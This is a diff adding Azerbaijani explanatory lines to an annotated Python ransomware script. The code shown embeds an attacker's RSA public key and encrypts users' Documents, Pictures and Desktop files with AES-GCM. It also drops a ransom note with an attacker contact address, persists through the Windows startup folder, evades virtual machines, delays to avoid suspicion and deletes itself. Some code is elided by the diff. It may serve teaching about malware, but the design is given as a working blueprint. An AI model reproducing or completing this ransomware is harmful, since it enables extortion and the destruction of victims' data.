@@ -11,6 +11,7 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
 
+Izahı:
 ➡️ Bu sətirlər kitabxanaları əlavə edir:
 
 os, time, sys, shutil, subprocess, platform, ctypes – sistem əməliyyatları, fayllarla işləmək, zaman gecikməsi, platforma məlumatı.
@@ -22,12 +23,14 @@ ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvH6ROxg...
 -----END PUBLIC KEY-----"""
 
+Izahı:
 ➡️ Hücumçunun açıq açarı (public key) burada saxlanılır.
 ➡️ Bu açar AES açarını şifrələmək üçün istifadə olunur
 
 Kod:
 public_key = load_pem_public_key(ATTACKER_PUBLIC_KEY_PEM)
 
+Izahı:
 ➡️ public_key dəyişəninə hücumçunun açıq açarı yüklənir.
 ➡️ Bu, sonra AES açarını şifrələmək üçün istifadə olunacaq.
 
@@ -35,6 +38,7 @@ Kod:
 def generate_aes_key():
     return AESGCM.generate_key(bit_length=128)
 
+Izahı:
 ➡️ Bu funksiya 128 bitlik təsadüfi AES açarı yaradır və geri qaytarır.
 
 Kod:
@@ -49,6 +53,7 @@ def encrypt_aes_key(aes_key):
     )
     return encrypted_key
 
+Izahı:
 ➡️ Bu funksiya AES açarını RSA ilə şifrələyir:
 ✅ Hücumçunun açıq açarını istifadə edir.
 ✅ OAEP padding ilə şifrələyir (təhlükəsizlik üçün).
@@ -67,6 +72,7 @@ def encrypt_file(file_path, aes_key):
     except Exception:
         pass
 
+Izahı:
 ➡️ Bu funksiya faylı şifrələyir:
 ✅ AES-GCM obyektini yaradır (AES açarından istifadə edir).
 ✅ Nonce yaradır (12 bayt təsadüfi dəyər – AES-GCM üçün vacibdir).
@@ -87,6 +93,7 @@ def get_targets():
                     targets.append(os.path.join(root, file))
     return targets
 
+Izahı:
 ➡️ Bu funksiya hədəf faylları tapır:
 ✅ Documents, Pictures, Desktop qovluqları üzrə gəzir.
 ✅ .exe və .dll fayllar istisna edilir.
@@ -107,6 +114,7 @@ Contact us at: attacker@tormail.onion
     except:
         pass
 
+Izahı:
 ➡️ Bu funksiya fidye qeydi yaradır:
 ✅ Qeyd mətnini README_DECRYPT.txt faylına masaüstündə yazır.
 ✅ Əgər səhv olsa, proqram donmur – except hissəsi boşdur.
@@ -126,6 +134,7 @@ def add_persistence():
         # For Linux/macOS, add a cron job or launch agent (not implemented here)
         pass
 
+Izahı:
 ➡️ Bu funksiya Windows-da özünü avtomatik işə düşəcək fayllar qovluğuna kopyalayır:
 ✅ startup folder yolunu alır.
 ✅ Cari skriptin tam yolunu tapır (sys.argv[0]).
@@ -149,6 +158,7 @@ def is_running_in_vm():
         pass
     return False
 
+Izahı:
 ➡️ Bu funksiya VM (virtual maşın) yoxlaması edir:
 ✅ Windows-da wmi ilə cihaz modelini yoxlayır.
 ✅ Digər OS-lərdə /sys/class/dmi/id/product_name faylını oxuyur.
@@ -162,6 +172,7 @@ def cleanup():
     except:
         pass
 
+Izahı:
 ➡️ Bu funksiya özünü silir:
 ✅ Cari skriptin yolunu alır və faylı silir.
 ✅ Əgər alınmasa, except boşdur.
@@ -189,6 +200,7 @@ def main():
     
     cleanup()
 
+Izahı:
 ➡️ main() funksiyası – prosesin ürəyi:
 ✅ 15 saniyə gecikmə edir (şübhəli görünməmək üçün).
 ✅ VM yoxlanışında çıxır.
@@ -201,6 +213,8 @@ def main():
 Kod:
 if __name__ == "__main__":
     main()
+
+Izahı:
 ➡️ Skript birbaşa işə salınarsa, main() funksiyası çağırılır.
 
 
